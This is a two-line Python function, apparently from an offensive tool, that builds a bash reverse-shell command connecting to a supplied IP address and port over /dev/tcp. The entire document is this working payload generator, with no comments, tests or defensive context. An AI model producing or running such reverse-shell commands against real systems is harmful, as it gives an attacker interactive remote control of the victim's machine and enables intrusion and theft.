def generate_shell(ip, port):
    return f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
